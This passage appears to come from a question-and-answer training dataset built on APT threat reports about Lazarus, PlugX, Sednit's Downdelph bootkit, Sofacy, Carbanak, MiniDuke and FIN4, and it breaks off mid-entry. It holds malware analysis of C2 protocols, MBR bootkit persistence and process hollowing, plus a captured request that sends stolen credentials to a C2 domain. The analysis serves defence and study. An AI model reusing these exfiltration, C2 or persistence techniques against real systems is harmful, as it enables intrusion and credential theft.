    "instruction": "Big Headline: Introduction\nIt is already well-known that Lazarus Group has targeted and successfully(<https://www.fireeye.com/blog/threat-research/2017/09/north-korea-interested-in-bitcoin.html>) breached several prominent cryptocurrency companies and exchanges. From these breaches, law enforcement agencies suspect that the group has amassed nearly (<http://www.bbc.com/news/world-asia-42378638>)$100 million worth of cryptocurrencies based on their value today. We hypothesize that many of these previously reported operations targeting cryptocurrency organizations have actually been conducted by the espionage team of the Lazarus Group based on evidence we provide in the Attribution section. Further, we assess that until today, many of Lazarus Group's traditional financially motivated team have remained largely in the shadows as they conduct these operations adding to their already impressive stockpile of various cryptocurrencies.\nSeveral (<https://www.symantec.com/connect/blogs/attackers-target-dozens-global-banks-new-malware-0>)watering hole attacks targeting the banking and financial industries that occurred at the end of 2016 and beginning of 2017 utilized a first stage downloader implant dubbed (<https://www.symantec.com/security_response/writeup.jsp?docid=2017-020908-1134-99>)Ratankba. During those incidents, Lazarus Group primarily used Ratankba as a reconnaissance tool, described by colleagues at Trend Micro as a utility to \"(<https://blog.trendmicro.com/trendlabs-security-intelligence/ratankba-watering-holes-against-enterprises/>)survey the lay of the land.\" In this research we detail a new implant dubbed PowerRatankba, a PowerShell-based malware variant that closely resembles the original Ratankba implant. We believe that PowerRatankba was likely developed as a replacement in Lazarus Group's strictly financially motivated team's arsenal to fill the hole left by Ratankba's discovery and very public documentation (<https://blog.trendmicro.com/trendlabs-security-intelligence/ratankba-watering-holes-against-enterprises/>)earlier this year.\nIn this report, we first provide a brief timeline of events related to the malicious activity. Next, we describe the various delivery methods that Lazarus Group utilized to infect victims with PowerRatankba (Fig. 1). We then detail the inner workings of PowerRatankba and how it is utilized to deliver a more fully capable backdoor to interesting victims (Fig. 1). Following that, we share details on a new and emerging threat targeting the South Korean point-of-sale industry that we have dubbed RatankbaPOS (Fig. 1). Finally, we explain our high-confidence attribution to Lazarus Group.\nQuestion: Why did the Lazarus Group develop the PowerRatankba implant, and how does its functionality compare to the original Ratankba implant?",
    "output": "Answer: The Lazarus Group developed the PowerRatankba implant as a replacement for the original Ratankba implant after the latter's discovery and extensive public documentation. PowerRatankba is a PowerShell-based malware variant that closely resembles the original Ratankba implant in terms of functionality. Both implants were used primarily as reconnaissance tools to 'survey the lay of the land.' However, PowerRatankba was designed to fill the gap left by Ratankba's exposure, indicating an evolution in the group's tactics to maintain their ability to conduct financially motivated operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Analysis of a Recent PlugX Variant - \"P2P PlugX\"\nThis is Shusei Tomonaga at Analysis Center.\nPlugX, a Remote Access Tool (RAT) often seen in many APT cases, has been in the wild for some years. Various sectors in Japan have been suffering from this type of attack from 2012, and Analysis Center has been working to catch up on the evolution of the PlugX family since then.\nIn this blog post, I will write about a recent PlugX variant which we first encountered in October 2014. The variant has interesting new aspects and the most significant one, in my view, is the P2P function - so let me tentatively name it \"P2P PlugX\".\n\nBased on the above text, answer a question. How does the P2P function in the 'P2P PlugX' variant enhance its capabilities compared to traditional PlugX variants, and what implications does this have for cybersecurity professionals?",
    "output": "The P2P function in the 'P2P PlugX' variant significantly enhances its capabilities by allowing the malware to communicate directly between infected systems without relying on a central command and control server. This decentralized communication model makes it harder for cybersecurity professionals to detect and disrupt the malware's operations. Traditional PlugX variants typically rely on a single point of failure, which can be targeted to neutralize the threat. However, the P2P functionality introduces a more resilient and adaptive infrastructure, posing greater challenges for defenders. Cybersecurity professionals need to adopt advanced detection techniques and network monitoring strategies to identify and mitigate the spread of P2P PlugX effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: CONCLUSION\nIn 2013, when we released the APT1 report exposing a PLA cyber espionage operation, it seemed like a quixotic effort to impede a persistent, well-resourced military operation targeting global corporations. Three years later, we see a threat that is less voluminous but more focused, calculated, and still successful in compromising corporate networks. Rather than viewing the Xi-Obama agreement as a watershed moment, we conclude that the agreement was one point amongst dramatic changes that had been taking place for years. We attribute the changes we have observed among China-based groups to factors including President Xi's military and political initiatives, the widespread exposure of Chinese cyber operations, and mounting pressure from the U.S. Government.\nYet China is not the only actor in transition: we've observed multiple state-backed and other well-resourced groups develop and hone their operations against corporate and government networks. The landscape we confront today is far more complex and diverse, less dominated by Chinese activity, and increasingly populated by a range of other criminal and state actors.\nTo download this or other FireEye iSight Intelligence reports, visit: www.fireeye.com/reports.html\nFireEye, Inc.\n1440 McCarthy Blvd. Milpitas, CA 95035\n408.321.6300 / 877.FIREEYE (347.3393) / info@FireEye.com\nwww.FireEye.com\n\u00a9 2016 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names are or may be trademarks or service marks of their respective owners.\n\nHow did the exposure of Chinese cyber operations and mounting pressure from the U.S. Government contribute to changes in the activities of China-based groups? What other factors played a role in these shifts, and how does this reflect the broader landscape of cyber threats today?",
    "output": "The exposure of Chinese cyber operations and mounting pressure from the U.S. Government contributed to changes in the activities of China-based groups by increasing scrutiny and accountability, which likely forced these groups to adapt their tactics. Additionally, President Xi's military and political initiatives played a significant role in these shifts. These factors collectively led to a reduction in the volume of cyber espionage but increased focus and sophistication in the remaining operations. This reflects a broader trend where the cyber threat landscape is now more complex and diverse, with a wider range of state-backed and criminal actors, and less dominance by Chinese activity alone.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: extend c&c servers list\nFirst, Downdelph downloads a main configuration file named extended.ini from the initial C&C server, whose address is hardcoded in the binary. The network request is an HTTP POST with a URI containing the file name to fetch encoded with a custom algorithm, as pictured in Figure 7.\nThe encoding algorithm was designed to make writing signatures on Down-delph network requests difficult. To do so, pseudo-randomly generated characters are inserted between each original character during the encoding, such that the same input text will be encoded differently each time.\nThe response from the server is an RC4-encrypted configuration file following the INI format (<>)[16], and composed of a single section named [options], which contains the key-value pairs described in Table 1.\nIf the Servers key is not empty, Downdelph adds the C&C server addresses to its list of servers to contact to download payloads.\nThe RC4 algorithm uses by default a 50-byte hardcoded value, to which the last two bytes of the input text are appended to form the key, before decrypting. This 50-byte value is present in other Sednit components, such as Seduploader and Xagent.\nSmall Headline: Payload Download\nFor each known C&C server \u2014 the initial one and the additional ones possibly provided in extended.ini\u2014 Downdelph performs three steps leading to the download of a payload.\nFirst, it sends a machine ID, which was previously generated from the hard drive serial number.\nSecond, it downloads a configuration file named pinlt.ini describing the payload to fetch from this particular C&C server (if any). The network request follows a format similar to the one shown in . The possible key-value pairs of the received file are described in Table 2.\nFinally, if the previous configuration file is non-empty, Downdelph downloads a payload from this C&C server, and processes it according to the configuration.\nOnce all C&C servers have been contacted, Downdelph sleeps for a certain amount of time (defined by the Sleep key in its configuration), and then re-starts the whole workflow from the beginning, including downloading the main configuration file from the initial C&C server.\nWe do not have in-the-wild examples of Downdelph configuration files. Nevertheless, we know that in a few cases this component eventually downloaded Sedreco and Xagent.\nSmall Headline: Bootkit\nInterestingly, we observed Downdelph deployment with a bootkit on two occasions, Cases 1 and 5 in . As defined in ESET's VirusRadar\u00ae (<>)[17], a bootkit is\"A type of rootkit that infects the Master Boot Record or Volume Boot Record (VBR) on a hard disk drive in order to ensure that its code will be run each time the computer boots. [\u2026]\".\nIn recent years, bootkits have become popular as a way to load unsigned malicious Windows drivers, which is normally prevented by the OS in 64-bit versions of Windows. But in the present case the bootkit serves as a stealthy persistence method for the user-mode downloader Downdelph \u2014 although for this purpose an unsigned driver will indeed be loaded, as we will describe later. Persistence through a bootkit makes detection harder, as its code is executed before the operating system is fully loaded.\nThe bootkit in question has the ability to infect Microsoft Windows versions from Windows XP to Windows 7, on both 32-bit and 64-bit architectures. To the best of our knowledge the bootkit used by Downdelph has never been documented, even though it belongs to the well-known category of bootkits infecting the Master Boot Record (MBR) \u2014 first sector of the hard drive \u2014 to take control of the startup process.\nWe will now describe the various components installed on the machine during the infection by the bootkit, and then how those components cooperate during startup to eventually execute Downdelph.\nVery Small Headline: Installation Process\nThe bootkit installation process varies depending on the Windows version, and whether the machine is 32-bit or 64-bit. In all cases the bootkit installer starts by overwriting the hard drive's first sectors \u2014 a sector being the basic hard drive storage unit, resulting in a new hard drive layout as shown in Figure 8 and described in the following.\nFirst things first: the MBR is overwritten with a custom version, while an encrypted copy of the original MBR code is stored in the second sector. Starting in the third sector comes the core bootkit code, encrypted with a simple XOR-based algorithm. This core code will be slightly different depending on the operating system versions, as the hooks \u2014 described later \u2014 put in place at startup will vary. Finally comes an RC4-encrypted Windows driver, which depending on the architecture will be a 32-bit or 64-bit binary.\nIn order to access the first sectors of the hard drive, the installer employs a technique previously seen in the infamous TDL4 bootkit (<>)[18], whose code is shown in Figure 9.\nOnce this device access is established, the installer simply calls the Windows API function WriteFile to overwrite the hard drive's first sectors. It should be noted that this method requires administrative rights on the system.\nSecond, the installer stores a DLL in the newly created Windows Registry key HKLM\\SYSTEM\\ CurrentControlSet\\Control\\Lsa\\Core Packages. As we will explain later, this binary is the user mode component of the bootkit. Additionally, Downdelph itself is stored in the same registry path, but in the key named Impersonation Packages.\nThese two files are stored in Windows' Registry following a custom-encrypted data format that is also used for the bootkit code initially contained in the installer. More precisely, the data are aPLib-compressed (<>)[19], then RC4-encrypted, and begin with the following header:\nThe magic 4-byte value\" :3\" is also written by the bootkit installer at offset 0x19B of the MBR, as a marker to indicate that the hard drive has already been infected in the event that the installer is re-executed.\nSmall Headline: Startup Process\nOnce installed, the bootkit takes control of the machine during the next system startup. The startup process is detailed in Figure 10 for Windows 7, where only the steps involving the bootkit are shown.\nRoughly summarized, a bootkit's objective is to\"survive\" Windows' startup and eventually to execute a payload once the operating system is fully running. Such survival is made difficult by the strong modifications of the machine state at each step of the startup process (for example by reorganizing memory or switching the CPU mode). Hence, starting from the initially infected MBR, the bootkit ensures at each step that it will regain control at the next step, mainly by setting hooks.\nWhile the bootkit workflow described in Figure 10 bears some similarities with other known MBR-infected bootkits (see\"Bootkits: Past, Present & Future\" (<>)[20] for some examples), there are certain particularities that we would like to point out:\n\u2022 The bootkit MBR decrypts the bootkit code and the bootkit driver initially stored from the third sector (see ) into a memory buffer. On the system we used for analysis, the buffer was located at physical memory address 0x97C00. This memory area therefore contains the bulk of the bootkit code, and the hooks in bootmgr, winload.exe and ACPI. sys re-route the execution flow to this buffer. It is more common for bootkits to copy their code at each step into a new memory area, in order to survive memory re-organization during startup.\n\u2022 This is the first use of the genuine Windows driver ACPI.sys in a bootkit, to the best of our knowledge. More precisely, the entry-point of this driver is patched to redirect to a small snippet of code written in its resources section, as shown in Figure 11.\nThis code receives as an input parameter the memory address of the Windows kernel ntoskrnl. exe, where the bootkit stores some crucial data in unused PE header fields. Using these data, it first restores the first five bytes of the original ACPI.sys entry-point, and then redirects to bootkit code stored at physical memory address 0x97C00, mapped in the virtual memory space using the Windows API MmMapIoSpace (<>)[21]. This bootkit code will decrypt and execute the bootkit driver.\nThe modifications to the ACPI.sys driver bypass Windows' bootloader integrity checks, because those checks are done on the hard-drive version of the file, not on the in-memory version.\n\u2022 The bootkit driver injects the bootkit user-mode component into the explorer.exe process by patching its entry-point before it is executed. The user mode component then loads Downdelph and, interestingly, it tries to set an exported global Boolean variable named m_bLoadedByBootkit in Downdelph to TRUE, as shown in Figure 12.\nAs this global variable is absent in all Downdelph binaries, we speculate that the bootkit was originally intended to be used with a different payload, and was repurposed by Sednit's operators.\nMoreover, the user-mode component of the bootkit exports two functions named Entry and ep_data. Those two export names are also present in early samples of the infamous BlackEnergy malware (<>)[11]. Also, we found several cases of code sharing between the bootkit components and the same BlackEnergy samples. These hints lead us to speculate that the developers may be related.\n\nExplain the process by which Downdelph downloads and processes payloads from its known C&C servers. What steps are involved, and what happens after all C&C servers have been contacted?",
    "output": "For each known C&C server, Downdelph performs three steps leading to the download of a payload. First, it sends a machine ID generated from the hard drive serial number. Second, it downloads a configuration file named pinlt.ini describing the payload to fetch from this particular C&C server. Finally, if the configuration file is non-empty, Downdelph downloads a payload from this C&C server and processes it according to the configuration. Once all C&C servers have been contacted, Downdelph sleeps for a certain amount of time (defined by the Sleep key in its configuration) and then restarts the entire workflow from the beginning, including downloading the main configuration file from the initial C&C server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "New Sofacy Attacks Against US Government Agency\nThe Sofacy group, also known as APT28, is a well-known threat group that frequently conducts cyber espionage campaigns. Recently, Unit 42 identified a spear phishing e-mail from the Sofacy group that targeted the United States government. The e-mail was sent from a potentially compromised account belonging to the Ministry of Foreign Affairs of another government entity and carried the Carberp variant of the Sofacy Trojan. The developer implemented a clever persistence mechanism in the Trojan, one which had not been observed in previous attacks. The focus of this blog will be on the attacks and the infrastructure associated with Sofacy using the new persistence mechanism as a correlation point.\nQ: How did the Sofacy group, also known as APT28, implement a novel persistence mechanism in their recent attack against a US government agency, and what makes this mechanism particularly notable?",
    "output": "In their recent attack against a US government agency, the Sofacy group implemented a new persistence mechanism in the Carberp variant of the Sofacy Trojan. This mechanism is particularly notable because it represents a departure from previously observed tactics, indicating an evolution in the group's capabilities. The developer's implementation of this clever persistence mechanism suggests a continuous effort by the Sofacy group to innovate and evade detection, making it crucial for cybersecurity experts to stay vigilant and adapt their defensive strategies accordingly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: THE YEAR IN FIGURES\n\u2022 In 2015 one or more malware attacks were blocked on 58% of corporate computers. This is a 3 p.p. rise on the previous year.\n\u2022 29% of computers \u2013 i.e. almost every third business-owned computer \u2013 were subjected to one or more web-based attacks.\n\u2022 Malware exploiting vulnerabilities in office applications were used 3 times more often than in attacks against home users.\n\u2022 File antivirus detection was triggered on 41% of corporate computers (objects were detected on computers or on removable media connected to computers: flash drives, memory cards, telephones, external hard drives, or network disks).\nBig Headline: TARGETED ATTACKS ON BUSINESSES: APT AND CYBERCRIMINALS\n2015 saw a number of APT attacks launched against businesses. The toolkits and methods used were very similar to those we observed when analyzing earlier APT attacks, but it was cybercriminals rather than state-sponsored groups who were behind the attacks. The methods used may not be characteristic of cybercriminals, but the main aim of their attacks remained the same: financial gain.\nThe  campaign became a vivid example of how APT-class targeted attacks have shifted focus to financial organizations. The campaign was one of bona fide bank robberies in the digital age: the cybercriminals penetrated a bank's network looking for a critical system, which they then used to siphon off money. After stealing a hefty sum (anywhere between $2.5 million and $10 million) from a bank, they moved on to the next victim.\nMost of the organizations targeted were located in Eastern Europe. However, the Carbanak campaign has also targeted victims in the US, Germany and China. Up to 100 financial institutions have been affected across the globe, and the total losses could be as a high as $1 billion.\nIt shouldn't be forgotten that information can also be of great value, especially if it can be used when making deals or trading on the stock exchange, be it in commodities, securities or currency markets, including cryptocurrency markets. One example of a targeted attack that may have been hunting for such information is Wild Neutron (aka Jripbot and Morpho). This cyber-espionage campaign first  when it affected several reputable companies, including Apple, Facebook, Twitter and Microsoft. After these incidents received widespread publicity the actors behind the cyberespionage campaign suspended their activities. However, about a year later Kaspersky Lab observed that Wild Neutron had resumed operations.\nOur research has shown that the cyberespionage campaign caused infections on user computers in 11 countries and territories, namely Russia, France, Switzerland, Germany, Austria, Slovenia, Palestine, the United Arab Emirates, Kazakhstan, Algeria and the US. The victims included law firms, investment companies, bitcoin-related companies, enterprises and business groups involved in M&A deals, IT companies, healthcare companies, real estate companies, as well as individual users.\nIt should be noted that Wild Neutron used a code signing certificate stolen from Acer.\nStolen Acer certificate in the Wild Neutron installer\nThe trend towards the diversification of APT attacks is well illustrated by the change in targets attacked by the Chinese cybercriminal group . It was a long-held belief that Winnti only attacked computer gaming companies. However, in autumn 2015 evidence began to emerge that showed the group had performed a test run of their tools and methods and were trying to make money by attacking new targets. Their attention is no longer limited to the entertainment industry, with recent targets\nincluding pharmaceutical and telecom companies. Analysis of the new wave of Winnti attacks has revealed that (as with Wild Neutron) the Winnti rootkit was signed with a stolen certificate that belonged to a division at a major Japanese conglomerate.\nAnother development in 2015 was the expanding geographies of both the attacks and the attackers. For example, when Kaspersky Lab experts were investigating a Middle East incident, they came across activity by a previously unknown group conducting targeted attacks. The group, dubbed the , is the first Arab actor to conduct full-blown cyberespionage attacks. At the time the group was detected, its victims numbered around 300, including financial organizations.\nAnother group named  attacked organizations and companies in Japan:\nInformation about targeted attacks on businesses is available in the following Kaspersky Lab reports: , , , , , , . More detailed research results are provided to subscribers of the .\nAnalysis of these attacks has identified several trends in the evolution of targeted attacks on businesses:\n\u2022 Financial organizations such as banks, funds and exchange-related companies, including cryptocurrency exchanges, have been subjected to attacks by cybercriminals.\n\u2022 The attacks are meticulously planned. The cybercriminals scrutinize the interests of potential victims (employees at the targeted company), and identify the websites they are most likely to visit; they examine the targeted company's contacts, equipment and service providers.\n\u2022 The information collected at the preparation stage is then put to use. The attackers hack legitimate websites that have been identified and the business contact accounts of the targeted company's employees. The sites and accounts are used for several hours to distribute malicious code, after which the infection is deactivated. This means the cybercriminals can re-use the compromised resources again later.\n\u2022 Signed files and legitimate software is used to collect information from the attacked network.\n\u2022 Attacks are diversifying to include small and medium-sized businesses.\n\u2022 The geography of attacks on businesses is expanding: a massive attack occurred in Japan, the emergence of new APT groups in Arab countries.\nAlthough there are relatively few APT attacks launched by cybercriminals, the way they are developing will undoubtedly influence the methods and approaches employed by other cybercriminals in their operations against businesses.\nBig Headline: STATISTICS\nThe statistics for corporate users (including the geography of attacks and ratings for detected objects) tend to coincide with those for home users. This is unsurprising because business users do not exist in an isolated environment and their computers are targeted by cybercriminals who spread malware irrespective of the nature of the target. These types of attacks and malware constitute the majority, while attacks specifically targeting business users have little impact on the overall statistics.\nIn 2015, one or more malware attack was blocked on 58% of corporate user computers, which is a 3 p.p. rise on last year.\nSmall Headline: TOP 10 web-based malicious programs\nPlease note that this ranking includes malicious programs only, and no adware. Although intrusive and annoying for users, adware does not cause any damage to a computer.\n* These statistics represent the detection verdicts of the web antivirus module. Information was provided by users of Kaspersky Lab products who consented to share their local statistical data.\n** The percentage of all web attacks recorded on the computers of unique users.\nThis Top 10 consists almost exclusively of verdicts assigned to malicious objects that are used in drive-by attacks \u2013 Trojan downloaders and exploits.\nSmall Headline: TOP 10 malicious programs detected on user computers\nThis ranking includes malicious programs only, and no adware. Although intrusive and annoying for users, adware does not cause any damage to a computer.\n* These statistics are compiled from malware detection verdicts generated by the on-access and on-demand scanner modules on the computers of those users running Kaspersky Lab products who have consented to submit their statistical data.\n** The proportion of individual users on whose computers the antivirus module detected these objects as a percentage of all attacked individual users.\nFirst place is occupied by various malicious programs that were detected with the help of cloud technologies, and assigned the umbrella verdict of 'DangerousObject.Multi.Generic'. Cloud technologies work when antivirus databases do not yet contain signatures or heuristics to detect a malicious program but the company's cloud antivirus database already includes information about the object. When a client company cannot send statistics to the cloud, Kaspersky Private Security Network is used instead, meaning that network computers receive protection from the cloud.\nMost of the remaining positions in the ranking are occupied by self-propagating malware programs and their components.\nBig Headline: CHARACTERISTICS OF ATTACKS ON BUSINESSES\nThe overall statistics for corporate users do not reflect the specific attributes of attacks launched against businesses; the stats are influenced more by the probability of a computer infection in a country, or by how popular a specific malware program is with cybercriminals.\nHowever, a more detailed analysis reveals the peculiarities of attacks on corporate users:\n\u2022 exploits for vulnerabilities found in office applications are used three times more often than in attacks on home users;\n\u2022 use of malicious files signed with valid digital certificates;\n\u2022 use of legitimate programs in attacks, allowing the attackers to go undetected for longer.\nWe have also observed a rapid growth in the number of corporate user computers attacked by encryptor programs.\nIn this particular context, the majority of cases are not APT attacks: \"standard\" cybercriminals are simply focusing on corporate users, and sometimes on a particular company that is of interest to them.\n\nHow did the Carbanak campaign demonstrate the shift in focus of APT-class targeted attacks towards financial organizations?",
    "output": "The Carbanak campaign exemplified the shift in focus of APT-class targeted attacks towards financial organizations by penetrating banks' networks to siphon off significant amounts of money, anywhere between $2.5 million and $10 million per bank. The campaign targeted up to 100 financial institutions globally, resulting in total losses potentially reaching $1 billion. The primary motive remained financial gain, with most targets located in Eastern Europe, although victims were also identified in the US, Germany, and China.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How could the threat actors behind the Sea Turtle campaign potentially utilize Process Injection: Process Hollowing to evade detection and maintain persistence in the targeted networks?",
    "output": "Process Injection: Process Hollowing is a technique used by adversaries to inject malicious code into suspended and hollowed processes, allowing them to evade process-based defenses. In the context of the Sea Turtle campaign, the threat actors demonstrated a high level of sophistication and ability to adapt to various security measures. One potential way they could utilize Process Injection: Process Hollowing is by creating a legitimate process on a compromised system, suspending it, and then unmapping its memory to replace it with malicious code. This would enable them to execute arbitrary code in the address space of a separate live process, potentially evading detection from security products. Furthermore, since the injected process would inherit the security context of the injecting process, it would likely not result in elevated privileges, but it would still allow the threat actors to maintain persistence in the targeted network. Given the threat actors' ability to impersonate VPN applications and perform MitM attacks, it is possible that they could use Process Injection: Process Hollowing to inject malicious code into legitimate processes, making it even more challenging for security products to detect their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 7. Malware Versions\nEach sample of the malware comes with a version number hardcoded in the binary. Different versions are usually linked to a different Twitter account. The vast number of versions indicates intense activity, but only a limited number of samples are known. The timestamp is isolated from the sample's PE header and represents the moment in which the executable file has been linked. Although it can be usually spoofed, we believe it is real, as we were able to correlate it with the moment we received each of the samples.\nMedium Headline: 2012\n2012/05/14 - 6.66 - trulrich\n2012/05/21 - 5.21 - trulrich\n2012/05/23 - 6.67 - zokath\n2012/06/06 - 6.06 - tonyafordy\n2012/09/04 - 0.49 - CurtinDiana\n2012/12/26 - 3.13 - RuthHarper14\nFor year 2012, there are a number of different versions, although we don't know if they follow a strict order or not. For instance, version 3.13 was released in December, while version 5.21 was spotted in May. It is possible that the servers hosting the samples to have run out of sync. This would explain why lower versions have shown up in December.\nBig Headline: 8. Anti-Reverse Techniques\nThe first defense mechanism to prevent analysis is the presence of the watermark. The binary file won't properly run on a different machine, since the data inside the malware would be decrypted improperly.\nOther techniques to prevent data decryption are present inside the binary:\n\uf0b7 Running software used for reverse engineering: OllyDbg, IDA, Process Monitor etc.\n\uf0b7 Running the binary in virtual machines: VMWare and VirtualBox.\n\uf0b7 Breakpoints added to the code or code alteration (hardware breakpoints need to be used instead).\nThe malware also monitors for signs of user interaction, a common technique used for anti-emulation and anti-automated malware analysis. Another important aspect for versions in 2012 and 2013 is the fact that the malware does not trigger right after installation, but rather wait for a system restart to execute its main code.\nMedium Headline: 9.2 The Loader\nThe loader decodes the information in the .data section with the UCL algorithm, then passes control to the decrypted code. This piece of code holds a small loader stub, followed by an executable file which is the backdoor itself. The stub overwrites the memory image of the original executable file with the backdoor so it is never written on disk.\nThe malware also creates the following key in the Registry HKCU\\Software\\Microsoft\\ApplicationManager with a value of AppID = <random> (the value is generated via the GetTickCount() function). Malware then waits in a loop and performs requests to info.leveldelta.com\nExample: GET /php/text.php?i=gigogrzf4J74xQdeBqVi6w360xlP2ksrNpY7dxmj Accept: */* User-Agent: Mozilla/4.0 Host: info .leveldelta.com\nThe base64 value in the request is a 30-byte buffer derived from AppID and GetTickCount() and is always different. We believe that it is used as an identifier. If it gets a response from the server, the malware performs a series of validations and execute the received commands.\nThe responses are sent via POST and contain the identifier from the GET request, followed by the command's result. This is the way the malware exfiltrates documents from the target computers.\nMedium Headline: 9.3 Backdoor commands\nmv - Moves a file. Uses MoveFileA api. cp - Copies a file. Uses CopyFileA api. rm - Deletes a file. Uses DeleteFileA api. pwd - Gets current dir. Uses GetCurrentDirectoryA api. cd - Sets current dir. Uses SetCurrentDirectoryA api. rmdir - Removes dir. Uses RemoveDirectoryA api. mkdir - Creates a dir. Uses CreateDirectoryA api. pskill - Kills process. Uses OpenProcess, TerminateProcess apis.\nexew - Create a process. Uses CreateProcessA api. conf - Gets some configuration data, creates a string \"id: 0x%08X\\char`\nhost: info.leveldelta.com\\\ncdt - Change to TEMP dir. Uses GetTempPathA, SetCurrentDirectoryA APIs. dev - Returns the list of drives in the system with their type (fixed, removable, etc). The following strings are used for their types: unk, nrt, rmv, fix, net, cdr, ram, und. Uses GetLogicalDriveStringsA, GetDriveTypeA apis. time - Gets the number of hours since the system was started: \"uptime %5d.%02dh\". Uses GetTickCount api. info - Gets info about system. String generated like: \"%d %s\\n%s\\\n%s\\\" using GetCurrentProcessId, GetModuleFileNameA, GetComputerNameA, GetUserNameA apis. exit - \"exiting...\" dir, ls - List files in current dir. Uses FindFirstFile(\"*\"), FindNextFile apis. exeu - CreateProcessWithLogonW and reads data from pipe. ecec - CreateProcessA and read data from pipe. put - Writes file on disk from internal buffer. Uses CreateFileA, WriteFile apis. get - Reads a file in chunks of 0x400 bytes and computes SHA1 on them. ps, pslist - Gets info about processes and their modules. Uses EnumProcesses, OpenProcess, EnumProcessModules, GetModuleFileNameExA apis.\nMedium Headline: 9.4 Servers\nWe have identified two servers used in the attack (sample md5/timestamp/server): 1e1b0d16a16cf5c7f3a7c053ce78f515, 2012-03-05 news.grouptumbler.com/news/feed.php b029378966d2694f8abd51f0d6c7822a, 2012-06-15 info.leveldelta.com/php/text.php 53db085a276ebbf5798ba756cac833ea, 2013-02-22 info.leveldelta.com/php/text.php\nWhois information on news.grouptumbler.com\nRegistrant Contact:\nGrouptumbler.COM\nTim K. Lappin ()\nFax:\n4573 Froe Street\nBluefield, WV 24701\nBluefield, WV 24701\nUS\n4573 Froe Street\nBluefield, WV 24701\nBluefield, WV 24701\nWhois information on info.leveldelta.com\nAbdul Kasim ()\nFax: 1442 Sokak No 49 Izmir, IZMIR 35432 TR 1442 Sokak No 49 Izmir, IZMIR 35432 TR\nMedium Headline: 10.2 Modus Operandi\nThe malware checks to see if the host computer connects to the Internet through a proxy server. If set, the malware uses the proxy settings. Regardless of the connection method, the malware connects to 85.95.236.114:443 using sockets.\nIt creates an unique identifier (DWORD size), from the socket handle. Everything is encrypted with XOR and a value of an address on the stack.\nIt sends the identifier on the opened socket.\nIt receives 16 bytes from the socket, and creates a MD5 hash on these. The MD5 hash will be used as key for the AES algorithm.\nIt receives 16 bytes used for AES encryption as initialization vector.\nIt receives 4 bytes, it performs a XOR operation with the identifier and allocates memory as follows: malloc(val XOR user_id)\nIt receives a number of size bytes, decrypts them with AES and calls the start of the decrypted buffer.\nThe payload can be used to load new modules. The received code needs to be completely relocatable as the main piece of malware. Using this technique, the attackers may introduce malicious code that will never be saved on disk, but rather executed directly from memory. We could also presume that some payloads have been exclusively delivered via this channel and can't be recovered for forensic investigation because they never made it on the disk drive.\nInformation about 85.95.236.114 Location: Turkey Izmir Inetmar Internet Hizmetleri San. Tic. Ltd. Sti ASN: AS49467 INETMAR INETMAR Internet Hizmetleri Autonomous System (izmir) (registered Jun 15, 2009)\nContact: person: Deniz Tosun org: ORG-IiHS1-RIPE address: 1370 sok. NO:42 Yalay Is Merkezi Kat:4/406 address: Montro/Konak/IZMIR Country: TR\n\nHow does MiniDuke establish communication with its command and control servers, and what encryption methods are used to secure this communication?",
    "output": "MiniDuke establishes communication with its command and control servers by first checking if the host computer connects to the Internet through a proxy server. If a proxy is set, the malware uses the proxy settings. Regardless of the connection method, it connects to 85.95.236.114:443 using sockets. It generates a unique identifier (DWORD size) from the socket handle and encrypts everything with XOR using a value from the stack. The identifier is sent on the opened socket, and the malware receives 16 bytes, creating an MD5 hash used as the key for AES encryption. It also receives 16 bytes for the AES initialization vector and 4 bytes for memory allocation. The payload is decrypted with AES and executed directly from memory, ensuring that no malicious code is saved on disk.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: VBA Macros Embedded into Legitimate Documents\nThe embedded VBA macro consists of a module typically entitled \"Module1\" and a user form that has been called both \"UserForm1\" and \"UserLoginForm\". The code in Module1 contains the information needed to communicate with the C2 server (Figure 7).\nFigure 7: Example of \"Module1\" used in one of the most recent campaigns\nThe userform contains the code for the user credentials prompt and an artifact that is highly indicative of the actors' targeting. The artifact (a campaign code) is usually tailored to the particular target company or the company from which they are targeting others; alternately, the artifact may represent a generic role for targeted individuals, such as SCIENTISTS_AND_RESEARCH or CEO_CFO_COO_CORPDEV. We have identified over 70 unique campaign codes to date. This campaign code is transmitted to the C2 server\nalong with the victim's username and password, as seen in Figure 8.\nMany of the fake Outlook windows opened by the macros contain the logo of the company targeted giving the pop-up apparent legitimacy. Figure 9 below represents a generic pop-up, with no company-specific information that a user might see after opening the document. Only after credentials are entered will the document appear for the user.\nFigure 9: Malicious Dialogue that Prompts for User's Credentials\nPOST /report.php?msg=FAKE_PHARMA&uname=john.doe&pword=abc123 HTTP/1.1\nConnection: Keep-Alive\nContent-Type: text/plain; Charset=UTF-8\nAccept: */*\nAccept-Language: en-us\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nContent-Length: 0\nHost: www.junomaat81.us\nMedium Headline: Networking and Infrastructure\nAfter the user enters data into the username and password fields, the data is transmitted to the C2 server via a POST request (Figure 10). FIN4 then uses the collected credentials to login to victim email accounts.  In addition to gaining access to the victim's private communications, FIN4 also uses the compromised accounts to email malicious documents to additional targets inside and outside the victim company. The group is currently active as this report goes to publication and recently used the domains junomaat81[.]us and lifehealthsanfrancisco2015[.]com as their C2s.\nFIN4 appears to be heavily reliant on Tor (software that enables users to browse the Internet anonymously by encrypting their internet traffic and routing it through servers around the world) and has been seen using Tor to login to victims' email accounts after obtaining the compromised user credentials.  We have detected at least two User Agents that the actors have used and which can be used to identify potentially suspicious OWA activity in network logs, when paired with originating Tor IP addresses.\nMozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0\nMozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0\nFigure 11: 